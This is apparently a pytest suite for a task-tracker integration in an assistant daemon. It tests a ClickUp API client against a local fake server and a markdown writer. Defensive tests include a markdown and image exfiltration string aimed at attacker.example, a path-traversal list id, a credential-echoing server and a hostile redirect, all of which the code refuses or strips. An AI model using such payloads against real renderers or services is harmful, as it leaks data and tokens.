"""Tracker adapters (Q2): the markdown default, the ClickUp REST adapter, and the CLI check.

ClickUp is a real HTTP round trip against an http.server thread on 127.0.0.1. Nothing leaves the
machine; the token, list ids and project names are synthetic.
"""
from __future__ import annotations

import json
import threading
import time
import tomllib
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

import pytest

from conftest import FakeClock
from jarvisd import ROOT, cli
from jarvisd.audit import AuditLog
from jarvisd.config import Config, ConfigError, build_config, load_config
from jarvisd.tracker import ClickUpTracker, MarkdownTracker, TrackerResult, build_tracker
from jarvisd.vault import VaultWriter

TOKEN = "pk_SYNTHETIC_0123456789_TOKEN"
ENV = "JARVIS_CLICKUP_TOKEN"
EM, EN = chr(0x2014), chr(0x2013)

PROPOSAL = {
    "id": "p-20261006-01",
    "title": "Review the open pull request on example-api",
    "project": "example-api",
    "rationale": "Two reviewers are waiting " + EM + " it blocks the release.",
    "evidence": ["it-1a2b3c4d", "it-5e6f7a8b"],
    "due": "2026-10-10",
}


class FakeClickUp:
    """Records every request; answers with a canned status, body and optional delay."""

    def __init__(self, status: int = 200, body: dict[str, Any] | str | None = None, delay: float = 0.0,
                 location: str | None = None, echo_auth: bool = False) -> None:
        self.requests: list[dict[str, Any]] = []
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self) -> None:  # noqa: N802
                length = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(length)
                outer.requests.append({"path": self.path, "headers": dict(self.headers),
                                       "json": json.loads(raw or b"null")})
                if delay:
                    time.sleep(delay)
                payload: dict[str, Any] | str
                if echo_auth:
                    payload = "your credential was " + self.headers.get("Authorization", "")
                elif body is not None:
                    payload = body
                elif status == 200:
                    payload = {"id": "86abc123", "url": "https://app.clickup.com/t/86abc123"}
                else:
                    payload = {"err": "failure", "ECODE": "X_1"}
                data = payload.encode("utf-8") if isinstance(payload, str) else json.dumps(payload).encode("utf-8")
                self.send_response(status)
                if location:
                    self.send_header("Location", location)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                try:
                    self.wfile.write(data)
                except OSError:
                    pass

            def log_message(self, *args: object) -> None:
                return

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}"
        self.thread = threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.02}, daemon=True)
        self.thread.start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def fake():  # type: ignore[no-untyped-def]
    made: list[FakeClickUp] = []

    def make(**kwargs: Any) -> FakeClickUp:
        server = FakeClickUp(**kwargs)
        made.append(server)
        return server

    yield make
    for server in made:
        server.close()


@pytest.fixture
def audit(tmp_cfg: Config, clock: FakeClock) -> AuditLog:
    return AuditLog(tmp_cfg.paths.logs / "jarvisd-audit.jsonl", clock=clock, mirror_stdout=False)


def audit_text(audit: AuditLog) -> str:
    return audit.path.read_text(encoding="utf-8") if audit.path.exists() else ""


def clickup_cfg(cfg: Config, server: FakeClickUp | None, **over: Any) -> Config:
    cfg.tracker.adapter = "clickup"
    c = cfg.tracker.clickup
    if server is not None:
        c.api_base = server.url
    c.lists = {"example-api": "901100", "Example-Web": "901200"}
    c.default_list_id = "901999"
    c.timeout_s = 2.0
    for key, value in over.items():
        setattr(c, key, value)
    return cfg


def tracker(cfg: Config, audit: AuditLog, env: dict[str, str] | None = None) -> ClickUpTracker:
    return ClickUpTracker(cfg, audit, environ={ENV: TOKEN} if env is None else env)


# --- ClickUp: the request ---------------------------------------------------------------------


def test_success_posts_the_documented_request(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server, status="to do")
    result = tracker(cfg, audit).create_task(PROPOSAL, {})
    assert result == TrackerResult(ok=True, url="https://app.clickup.com/t/86abc123",
                                   external_id="86abc123", error=None)
    req = server.requests[0]
    assert req["path"] == "/list/901100/task"
    assert req["headers"]["Authorization"] == TOKEN
    assert req["headers"]["Content-Type"].startswith("application/json")
    body = req["json"]
    assert body["name"] == PROPOSAL["title"]
    assert "Two reviewers are waiting, it blocks the release." in body["description"]
    assert "it-1a2b3c4d" in body["description"] and "it-5e6f7a8b" in body["description"]
    assert body["description"].rstrip().endswith("Created by JARVIS from proposal p-20261006-01")
    assert body["status"] == "to do"
    expect = int(datetime(2026, 10, 10, 12, 0, tzinfo=timezone.utc).timestamp() * 1000)
    assert body["due_date"] == expect and body["due_date_time"] is False


def test_no_due_and_no_status_means_neither_key(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, "due": None}, {})
    body = server.requests[0]["json"]
    assert "due_date" not in body and "status" not in body


def test_edits_override_the_proposal(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    edits = {"title": "Edited title", "rationale": "Edited why", "due": "2026-11-01", "status": "open"}
    tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, edits)
    body = server.requests[0]["json"]
    assert body["name"] == "Edited title" and "Edited why" in body["description"]
    assert "Two reviewers" not in body["description"] and body["status"] == "open"
    assert body["due_date"] == int(datetime(2026, 11, 1, 12, 0, tzinfo=timezone.utc).timestamp() * 1000)


def test_no_dash_characters_are_sent(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, "title": "a" + EN + "b"}, {})
    sent = json.dumps(server.requests[0]["json"], ensure_ascii=False)
    assert EM not in sent and EN not in sent


@pytest.mark.parametrize("project,edits,expected", [
    ("example-api", {}, "901100"),
    ("EXAMPLE-WEB", {}, "901200"),
    ("unmapped", {}, "901999"),
    ("example-api", {"list_id": "555"}, "555"),
])
def test_list_resolution(tmp_cfg: Config, audit: AuditLog, fake, project: str,  # type: ignore[no-untyped-def]
                         edits: dict[str, str], expected: str) -> None:
    server = fake()
    tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, "project": project}, edits)
    assert server.requests[0]["path"] == f"/list/{expected}/task"


def test_no_list_at_all_sends_nothing(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server, default_list_id="", lists={})
    result = tracker(cfg, audit).create_task(PROPOSAL, {})
    assert not result.ok and result.error == "no_list" and server.requests == []


def test_a_hostile_list_id_edit_is_refused(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {"list_id": "1/../../team"})
    assert not result.ok and result.error == "bad_list_id" and server.requests == []


@pytest.mark.parametrize("bad", [{"title": ""}, {"title": "   "}])
def test_a_proposal_without_a_title_is_refused(tmp_cfg: Config, audit: AuditLog, fake,  # type: ignore[no-untyped-def]
                                               bad: dict[str, str]) -> None:
    server = fake()
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, **bad}, {})
    assert not result.ok and result.error == "invalid_proposal:title" and server.requests == []


def test_a_malformed_due_is_refused(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, "due": "next week"}, {})
    assert not result.ok and result.error == "invalid_proposal:due" and server.requests == []


def test_proposal_may_be_an_object_with_attributes(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    class Prop:
        id = "p-9"
        title = "Attr title"
        project = "example-api"
        rationale = "why"
        evidence = ("it-1",)
        due = None

    server = fake()
    assert tracker(clickup_cfg(tmp_cfg, server), audit).create_task(Prop(), {}).ok
    assert server.requests[0]["json"]["name"] == "Attr title"


# --- ClickUp: failure modes -------------------------------------------------------------------


def test_401_is_a_clean_failure_and_the_echoed_token_never_survives(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake(status=401, echo_auth=True)
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {})
    assert not result.ok and result.url is None and result.external_id is None
    assert result.error is not None and result.error.startswith("http_401")
    assert TOKEN not in result.error
    assert TOKEN not in audit_text(audit)
    assert len(server.requests) == 1  # a create is never retried: it would duplicate


def test_500_truncates_the_body(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake(status=500, body="x" * 5000)
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {})
    assert not result.ok and result.error is not None and result.error.startswith("http_500")
    assert len(result.error) < 400
    assert len(server.requests) == 1
    failed = audit.records(events=["tracker_result"])[0]
    assert failed["ok"] is False and failed["http_status"] == 500


def test_timeout(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake(delay=1.5)
    cfg = clickup_cfg(tmp_cfg, server, timeout_s=0.3)
    result = tracker(cfg, audit).create_task(PROPOSAL, {})
    assert not result.ok and result.error == "timeout"


def test_connection_refused_is_a_network_error(tmp_cfg: Config, audit: AuditLog) -> None:
    # A stub opener, not a closed port: Windows takes about two seconds to report a refused connect.
    import urllib.error

    class Refused:
        def open(self, *args: Any, **kwargs: Any) -> Any:
            raise urllib.error.URLError(ConnectionRefusedError(10061, "refused"))

    t = ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN}, opener=Refused())
    result = t.create_task(PROPOSAL, {})
    assert not result.ok and result.error == "network"


def test_an_unexpected_exception_never_escapes(tmp_cfg: Config, audit: AuditLog) -> None:
    class Boom:
        def open(self, *args: Any, **kwargs: Any) -> Any:
            raise RuntimeError("carrying " + TOKEN)

    t = ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN}, opener=Boom())
    result = t.create_task(PROPOSAL, {})
    assert not result.ok and result.error == "error:RuntimeError" and TOKEN not in audit_text(audit)


def test_token_absent_sends_nothing(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    for env in ({}, {ENV: ""}, {ENV: "   "}):
        result = tracker(clickup_cfg(tmp_cfg, server), audit, env=env).create_task(PROPOSAL, {})
        assert not result.ok and result.error == "token_absent"
    assert server.requests == []


def test_a_non_json_success_body_is_a_failure(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake(status=200, body="<html>proxy</html>")
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {})
    assert not result.ok and result.error == "bad_response"


def test_redirects_are_not_followed(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    elsewhere = fake()
    server = fake(status=302, location=elsewhere.url + "/stolen")
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {})
    assert not result.ok and elsewhere.requests == []


def test_the_token_from_the_environment_is_read_at_call_time(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    env: dict[str, str] = {}
    t = tracker(clickup_cfg(tmp_cfg, server), audit, env=env)
    assert t.create_task(PROPOSAL, {}).error == "token_absent"
    env[ENV] = TOKEN
    assert t.create_task(PROPOSAL, {}).ok


def test_a_custom_token_env_name_is_honoured(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server)
    cfg.tracker.clickup_token_env = "MY_OTHER_VAR"
    t = ClickUpTracker(cfg, audit, environ={"MY_OTHER_VAR": TOKEN})
    assert t.create_task(PROPOSAL, {}).ok and server.requests[0]["headers"]["Authorization"] == TOKEN


# --- ClickUp: dry run and the audit -----------------------------------------------------------


def test_dry_run_returns_the_exact_request_and_sends_nothing(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server, dry_run=True)
    result = tracker(cfg, audit).create_task(PROPOSAL, {})
    assert result.ok and result.dry_run and result.url is None and result.external_id is None
    assert server.requests == []
    # The owner sees the request in the result; the audit chain keeps ids and counts only.
    assert result.request is not None
    sent = json.loads(result.request)
    assert sent["name"] == PROPOSAL["title"] and "it-1a2b3c4d" in sent["description"]
    row = audit.records(events=["tracker_dry_run"])[0]
    assert row["method"] == "POST" and row["url"] == server.url + "/list/901100/task"
    assert row["authorization"] == "<redacted>" and row["bytes"] > 0 and len(row["sha256"]) == 64
    assert "request_json" not in row
    text = audit_text(audit)
    assert PROPOSAL["title"] not in text and "Two reviewers" not in text and TOKEN not in text


def test_dry_run_needs_no_token(tmp_cfg: Config, audit: AuditLog) -> None:
    cfg = clickup_cfg(tmp_cfg, None, dry_run=True)
    result = tracker(cfg, audit, env={}).create_task(PROPOSAL, {})
    assert result.ok and result.dry_run


def test_every_attempt_is_audited_and_the_token_never_appears(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    for status, echo in ((200, False), (401, True), (500, True)):
        server = fake(status=status, echo_auth=echo)
        tracker(clickup_cfg(tmp_cfg, server), audit).create_task(PROPOSAL, {})
    tracker(clickup_cfg(tmp_cfg, None, dry_run=True), audit).create_task(PROPOSAL, {})
    tracker(clickup_cfg(tmp_cfg, None, dry_run=False), audit, env={}).create_task(PROPOSAL, {})
    text = audit_text(audit)
    assert text and TOKEN not in text and "SYNTHETIC" not in text
    intents = audit.records(events=["tracker_intent"])
    results = audit.records(events=["tracker_result"])
    assert len(intents) == 3 and len(results) == 4  # the token-absent attempt has a result, no intent
    assert all(r["adapter"] == "clickup" and r["proposal_id"] == PROPOSAL["id"] for r in intents + results)
    assert audit.verify()[0] is True


# --- markdown adapter -------------------------------------------------------------------------


def test_markdown_appends_a_block_through_the_vault_writer(tmp_cfg: Config, audit: AuditLog) -> None:
    when = datetime(2026, 10, 6, 9, 0, tzinfo=timezone.utc)
    md = MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit, clock=lambda: when)
    result = md.create_task(PROPOSAL, {})
    path = tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md"
    assert result.ok and result.error is None
    assert result.url == path.as_uri() and result.external_id == "md-p-20261006-01"
    text = path.read_text(encoding="utf-8")
    assert text.startswith("---\n") and "\ngenerator: jarvisd\n" in text
    assert "Review the open pull request on example-api" in text
    assert "it-1a2b3c4d" in text and "p-20261006-01" in text and "2026-10-10" in text
    assert "Two reviewers are waiting, it blocks the release." in text
    assert md.create_task({**PROPOSAL, "id": "p-2", "title": "Second"}, {}).ok
    text = path.read_text(encoding="utf-8")
    assert text.count("generator: jarvisd") == 1 and text.index("Review the open") < text.index("Second")
    assert EM not in text and EN not in text


def test_markdown_edits_win(tmp_cfg: Config, audit: AuditLog) -> None:
    md = MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit)
    md.create_task(PROPOSAL, {"title": "Edited", "due": "2026-12-24"})
    text = (tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md").read_text(encoding="utf-8")
    assert "Edited" in text and "2026-12-24" in text and "Review the open" not in text


def test_markdown_refuses_a_foreign_file_and_leaves_it(tmp_cfg: Config, audit: AuditLog) -> None:
    path = tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md"
    path.write_text("# mine\n", encoding="utf-8", newline="\n")
    result = MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit).create_task(PROPOSAL, {})
    assert not result.ok and result.error == "vault:existing_file_not_ours" and result.url is None
    assert path.read_text(encoding="utf-8") == "# mine\n"


def test_markdown_audits_the_create(tmp_cfg: Config, audit: AuditLog) -> None:
    MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit).create_task(PROPOSAL, {})
    row = audit.records(events=["tracker_result"])[0]
    assert row["adapter"] == "markdown" and row["ok"] is True and row["proposal_id"] == PROPOSAL["id"]
    assert audit.records(events=["vault_write"])[0]["op"] == "append"


def test_markdown_rejects_a_proposal_without_a_title(tmp_cfg: Config, audit: AuditLog) -> None:
    result = MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit).create_task({**PROPOSAL, "title": ""}, {})
    assert not result.ok and result.error == "invalid_proposal:title"
    assert not (tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md").exists()


# --- config and factory -----------------------------------------------------------------------


def test_default_adapter_is_markdown(tmp_cfg: Config) -> None:
    assert tmp_cfg.tracker.adapter == "markdown"
    assert tmp_cfg.tracker.clickup_token_env == ENV
    assert tmp_cfg.tracker.clickup.lists == {} and tmp_cfg.tracker.clickup.dry_run is False


def test_build_tracker_follows_the_config(tmp_cfg: Config, audit: AuditLog) -> None:
    assert isinstance(build_tracker(tmp_cfg, audit), MarkdownTracker)
    tmp_cfg.tracker.adapter = "clickup"
    assert isinstance(build_tracker(tmp_cfg, audit, environ={}), ClickUpTracker)
    assert build_tracker(tmp_cfg, audit).name == "clickup"


def _raw(extra: dict[str, Any]) -> dict[str, Any]:
    raw = tomllib.loads((ROOT / "jarvis.toml").read_text(encoding="utf-8"))
    raw["tracker"] = {**raw.get("tracker", {}), **extra}
    return raw


@pytest.mark.parametrize("extra", [
    {"adapter": "jira"},
    {"clickup_token_env": "pk_real-token"},
    {"clickup_token_env": "has space"},
    {"clickup": {"lists": {"p": "not-digits"}}},
    {"clickup": {"lists": {"": "123"}}},
    {"clickup": {"default_list_id": "12/34"}},
    {"clickup": {"api_base": "http://example.invalid/api/v2"}},
    {"clickup": {"api_base": "ftp://example.invalid"}},
    {"clickup": {"typo_key": 1}},
    {"unknown": 1},
])
def test_bad_tracker_config_fails_closed(extra: dict[str, Any]) -> None:
    with pytest.raises(ConfigError):
        build_config(_raw(extra))


def test_a_good_tracker_config_loads() -> None:
    cfg = build_config(_raw({"adapter": "clickup", "clickup": {
        "lists": {"example-api": "901100"}, "default_list_id": "901999", "status": "to do",
        "api_base": "http://127.0.0.1:9/api/v2/"}}))
    assert cfg.tracker.adapter == "clickup" and cfg.tracker.clickup.lists["example-api"] == "901100"
    assert cfg.tracker.clickup.api_base == "http://127.0.0.1:9/api/v2"


def test_the_tracked_jarvis_toml_names_the_default_adapter() -> None:
    raw = tomllib.loads((ROOT / "jarvis.toml").read_text(encoding="utf-8"))
    assert raw["tracker"]["adapter"] == "markdown"


def test_the_example_local_file_loads_with_synthetic_tracker_entries(tmp_path: Path) -> None:
    text = (ROOT / "jarvis.local.toml.example").read_text(encoding="utf-8")
    assert "[tracker.clickup.lists]" in text
    local = tmp_path / "jarvis.local.toml"
    local.write_text(text, encoding="utf-8", newline="\n")
    cfg = load_config(ROOT / "jarvis.toml", local_path=local)
    assert cfg.tracker.adapter == "markdown"
    assert cfg.tracker.clickup.lists and all(v.isdigit() for v in cfg.tracker.clickup.lists.values())


# --- the CLI ----------------------------------------------------------------------------------


def run_cli(cfg: Config, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch,
            token: str | None = None) -> tuple[int, str]:
    monkeypatch.delenv(ENV, raising=False)
    if token is not None:
        monkeypatch.setenv(ENV, token)
    code = cli.main(["tracker", "check"], cfg=cfg)
    return code, capsys.readouterr().out


def test_cli_check_markdown_ready_and_clickup_token_absent(tmp_cfg: Config, capsys, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    code, out = run_cli(tmp_cfg, capsys, monkeypatch)
    assert code == 0
    assert "adapter: markdown (ready)" in out
    assert "clickup token present: no" in out
    assert "clickup list map: 0" in out
    assert "markdown path writable: yes" in out
    assert not (tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md").exists()


def test_cli_check_never_sends_or_writes_or_prints_the_token(tmp_cfg: Config, fake, capsys, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server)
    code, out = run_cli(cfg, capsys, monkeypatch, token=TOKEN)
    assert code == 0 and server.requests == []
    assert "adapter: clickup (ready)" in out and "clickup token present: yes" in out
    assert "clickup list map: 2" in out
    assert TOKEN not in out and "901100" not in out
    audit_file = cfg.paths.logs / "jarvisd-audit.jsonl"
    assert TOKEN not in (audit_file.read_text(encoding="utf-8") if audit_file.exists() else "")


def test_cli_check_clickup_without_token_is_not_ready(tmp_cfg: Config, capsys, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    cfg = clickup_cfg(tmp_cfg, None)
    code, out = run_cli(cfg, capsys, monkeypatch)
    assert code == 1 and "adapter: clickup (not ready)" in out and "clickup token present: no" in out


def test_cli_check_clickup_without_any_list_is_not_ready(tmp_cfg: Config, capsys, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    cfg = clickup_cfg(tmp_cfg, None, default_list_id="", lists={})
    code, out = run_cli(cfg, capsys, monkeypatch, token=TOKEN)
    assert code == 1 and "no list" in out


def test_cli_check_markdown_blocked_by_a_foreign_file(tmp_cfg: Config, capsys, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    (tmp_cfg.paths.vault_write_raw / "confirmed-tasks.md").write_text("# mine\n", encoding="utf-8", newline="\n")
    code, out = run_cli(tmp_cfg, capsys, monkeypatch)
    assert code == 1 and "adapter: markdown (not ready)" in out and "markdown path writable: no" in out


# --- the stored Proposal model ----------------------------------------------------------------


def _model_proposal(**over: Any) -> Any:
    from jarvisd.models import Proposal

    base = {"id": "p-20261006-07", "created_at": "2026-10-06T06:30:00+00:00", "run_id": "digest-2026-10-06",
            "title": "Chase the failing build", "project": "example-api", "kind": "task",
            "evidence": ["it-1a2b3c4d", "github:pr:42"], "suggested_status": "to do",
            "due_hint": "2026-10-09", "rationale": "CI has been red since Monday."}
    return Proposal(**{**base, **over})


def test_the_stored_proposal_model_works_with_both_adapters(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    from jarvisd.models import ProposalEdits

    server = fake()
    proposal = _model_proposal()
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task(proposal, ProposalEdits(title="Edited"))
    assert result.ok
    body = server.requests[0]["json"]
    assert body["name"] == "Edited" and "github:pr:42" in body["description"]
    assert body["due_date"] == int(datetime(2026, 10, 9, 12, 0, tzinfo=timezone.utc).timestamp() * 1000)
    assert MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit).create_task(proposal, ProposalEdits()).ok


def test_an_explicit_empty_due_edit_clears_the_hint(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    tracker(clickup_cfg(tmp_cfg, server), audit).create_task(_model_proposal(), {"due": ""})
    assert "due_date" not in server.requests[0]["json"]


def test_evidence_with_whitespace_is_refused(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    result = tracker(clickup_cfg(tmp_cfg, server), audit).create_task({**PROPOSAL, "evidence": ["it-1 and some text"]}, {})
    assert not result.ok and result.error == "invalid_proposal:evidence" and server.requests == []


# --- release 1.2.0: ambiguous outcomes, scans, markdown neutralizing, dry run --------------------------------------


def test_a_dry_run_is_ready_without_a_token(tmp_cfg: Config, audit: AuditLog) -> None:
    on = tracker(clickup_cfg(tmp_cfg, None, dry_run=True), audit, env={})
    assert on.problems() == []
    off = tracker(clickup_cfg(tmp_cfg, None, dry_run=False), audit, env={})
    assert any("no ClickUp token" in p for p in off.problems())
    # a missing list is still a problem in a dry run: the request could not be built
    cfg = clickup_cfg(tmp_cfg, None, dry_run=True)
    cfg.tracker.clickup.lists, cfg.tracker.clickup.default_list_id = {}, ""
    assert any("no list configured" in p for p in tracker(cfg, audit, env={}).problems())


@pytest.mark.parametrize("kind", ["timeout", "http_500", "bad_response", "network", "exception"])
def test_outcomes_where_the_task_may_exist_are_flagged_unknown(tmp_cfg: Config, audit: AuditLog, fake, kind: str) -> None:  # type: ignore[no-untyped-def]
    import urllib.error

    class Stub:
        def __init__(self, error: BaseException) -> None:
            self.error = error

        def open(self, *args: Any, **kwargs: Any) -> Any:
            raise self.error

    if kind == "timeout":
        t = ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN},
                           opener=Stub(TimeoutError("read timed out")))
    elif kind == "network":
        t = ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN},
                           opener=Stub(urllib.error.URLError(ConnectionResetError(10054, "reset"))))
    elif kind == "exception":
        t = ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN}, opener=Stub(RuntimeError("x")))
    elif kind == "http_500":
        t = tracker(clickup_cfg(tmp_cfg, fake(status=500)), audit)
    else:
        t = tracker(clickup_cfg(tmp_cfg, fake(status=200, body={"id": "not an id!"})), audit)
    result = t.create_task(PROPOSAL, {})
    assert not result.ok and result.unknown is True
    assert audit.records(events=["tracker_result"])[-1]["outcome_unknown"] is True


def test_outcomes_where_no_task_can_exist_are_not_unknown(tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    import urllib.error

    class Refused:
        def open(self, *args: Any, **kwargs: Any) -> Any:
            raise urllib.error.URLError(ConnectionRefusedError(10061, "refused"))

    assert ClickUpTracker(clickup_cfg(tmp_cfg, None), audit, environ={ENV: TOKEN},
                          opener=Refused()).create_task(PROPOSAL, {}).unknown is False
    assert tracker(clickup_cfg(tmp_cfg, fake(status=401), ), audit).create_task(PROPOSAL, {}).unknown is False
    assert tracker(clickup_cfg(tmp_cfg, fake(status=422), ), audit).create_task(PROPOSAL, {}).unknown is False
    assert tracker(clickup_cfg(tmp_cfg, fake()), audit).create_task(PROPOSAL, {}).unknown is False
    assert tracker(clickup_cfg(tmp_cfg, None), audit, env={}).create_task(PROPOSAL, {}).unknown is False


def test_a_sensitive_term_in_the_title_or_rationale_stops_the_create_before_any_request(
        tmp_cfg: Config, audit: AuditLog, fake) -> None:  # type: ignore[no-untyped-def]
    server = fake()
    cfg = clickup_cfg(tmp_cfg, server)
    cfg.gates.sensitive_terms = ["zebra-codename"]
    t = tracker(cfg, audit)
    for edits in ({"title": "Ship the zebra-codename release"}, {"project": "Zebra-Codename"}):
        result = t.create_task(PROPOSAL, edits)
        assert not result.ok and result.error == "invalid_proposal:sensitive" and result.unknown is False
    result = t.create_task({**PROPOSAL, "rationale": "About the ZEBRA-CODENAME work"}, {})
    assert result.error == "invalid_proposal:sensitive"
    assert server.requests == []
    assert "zebra" not in audit_text(audit).casefold()
    md = MarkdownTracker(cfg, VaultWriter(cfg, audit), audit)
    assert md.create_task(PROPOSAL, {"title": "zebra-codename"}).error == "invalid_proposal:sensitive"
    assert not (Path(cfg.paths.vault_write_raw) / "confirmed-tasks.md").exists()


HOSTILE = "See ![x](https://attacker.example/p?d=abc) and [link](https://attacker.example/q) <img src=\"https://attacker.example/" + "z" * 120 + "\"> now"


def test_markdown_block_neutralizes_images_links_and_html(tmp_cfg: Config, audit: AuditLog) -> None:
    md = MarkdownTracker(tmp_cfg, VaultWriter(tmp_cfg, audit), audit)
    result = md.create_task({**PROPOSAL, "rationale": HOSTILE, "title": "A ![t](https://attacker.example/t) title"}, {})
    assert result.ok
    text = (Path(tmp_cfg.paths.vault_write_raw) / "confirmed-tasks.md").read_text(encoding="utf-8")
    assert "attacker.example" not in text and "![" not in text and "](" not in text and "<img" not in text
    assert "See" in text and "link" in text and "now" in text


def test_neutralize_markdown_unit() -> None:
    from jarvisd.tracker import neutralize_markdown

    assert neutralize_markdown("a ![x](https://e.example/p) b") == "a x b"
    assert neutralize_markdown("a [t](https://e.example/p) b") == "a t b"
    assert neutralize_markdown("a ![x][ref] b [y][r2]") == "a x b y"
    assert neutralize_markdown("<https://e.example/p?q=1>") == ""
    assert neutralize_markdown("plain 1 < 2 and 3 > 2") == "plain 1 < 2 and 3 > 2"
    assert neutralize_markdown("![[Embedded note]]") == "Embedded note"
    assert neutralize_markdown("nested ![a [b]](https://e.example/p)").count("e.example") == 0
